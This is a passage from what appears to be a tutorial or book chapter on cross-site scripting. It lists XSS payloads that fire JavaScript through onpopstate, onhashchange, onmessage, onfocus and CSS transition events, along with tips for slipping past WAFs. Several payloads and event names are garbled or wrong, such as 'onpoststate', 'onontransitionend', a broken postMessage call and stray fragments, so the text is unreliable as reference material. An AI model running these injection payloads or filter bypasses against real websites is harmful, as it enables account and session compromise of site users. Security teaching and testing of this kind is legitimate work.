    ## Navigation based events


    There are a few events you can use that require some sort of navigation to fire.
    One such event is onpoststate, which is fired when the history changes. In order
    to fire this event you have to change the URL of the target in some way. This
    most likely involves an iframe, thing worth noting that when using cross origin
    iframe alert(1) doesn''t work, you have to use the print() function instead. Here
    are some examples:


    ```

    <body>onpoststate=alert(1)<script>location.hash=1</script>

    ```


    ```

    <iframe src="//target?x=<body>/onpoststate=print()" onload=this.src%2b=''%23''>

    ```


    You can use iframes to cause modification to the hash portion of the URL to fire
    events hashchange to:


    ```

    <iframe src="//target?x=<body/onhashchange=print()" onload=this.src%2b=''%23''>

    ```


    ## onmessage


    Using iframes again you can load an external URL with your injection of the onmessage
    handler and then using postMessage to fire the event:


    ```

    <iframe src="//target?x=<body/onmessage=print()" onload=this.contentWindow.postMessage(age('''',
    ''*'')''>

    ```


    ## onfocus


    Usually this event can be fired using textarea or input the autofocus attribute.
    It''s possible to get this event to work on other elements by tabindexing and
    an id attribute. Tabindex is an accessibility attribute that lets you choose which
    elements on the page are selected when you press tab. By combining this with an
    id attribute and using hash from the URL it will automatically focus the element:


    ```

    <x focus=alert(1) id=x tabindex=1>

    ```


    homepage.html There''s another trick too, you can actually use the autofocus attribute
    on any element least on Chrome, provided you use the tabindex in conjunction with
    it. This means you don''t need an id attribute or a hash:


    ```

    <x autofocus=alert(1) autofocus tabindex=1>

    ```


    Similarly there is a related event called autofocus which you can use to bypass
    a WAF and have the same behaviour above.


    ## Animation based events


    It''s well known that you can use CSS transitions/animations to fire events on
    any tag. If you''re not aware here how to do it:


    ```

    <style>:target{color: red;}</style>

    ```


    ```

    <x id=x style="transition:color 10s" onontransitioncancel=print()></x>

    ```


    somepage.html#x


    This works by using the :target selector to change styles when the id specified
    in the hash portion of the URL is found. This then fires. The downside with this
    particular approach is that it creates a style block which would probably be blocked
    by a WAF or filter. There is another way, you can use the trick described earlier
    to focus the element and because Chrome adds a CSS outline to elements focused
    you can use a transition which will fire the event because the outline will:


    ```

    <x id=x style="transition:outline 1s" onontransitionend=alert(1) tabindex=1></x>

    ```


    somepage.html#x


    If you''re having trouble sneaking that event in there there''s always the we
    variant you can use:


    ```

    <x id=x style="transition:outline 1s" onwebkittransitionend=alert(1) tabindex=1>

    x>

    ```


    somepage.html#x


    ## Summary


    We covered a lot in this chapter. I basically tried to do a brain dump of obscure
    tricks I could think of or answers to questions I''ve been asked on Twitter. First
    covered how to close scripts without a closing tag. Then covered how to abuse
    HTML contents inside scripts, HTML entities including SVG, how to abuse payloads
    and cookies. We learned how to use sources to send a pingback to an attacker controlled
    server. After that we demonstrated a new JavaScript function called navigate that
    works in Chrome. We covered all the comments in JavaScript and the whitespaces
    later. Later we showed how to use dynamic imports with data URLs. Afterward we
    covered how to get HTML inside an XML document. Then we showed how to use SVG
    objects and use elements. After that we covered HTML entities and finally finished
    off with some less known JavaScript events.


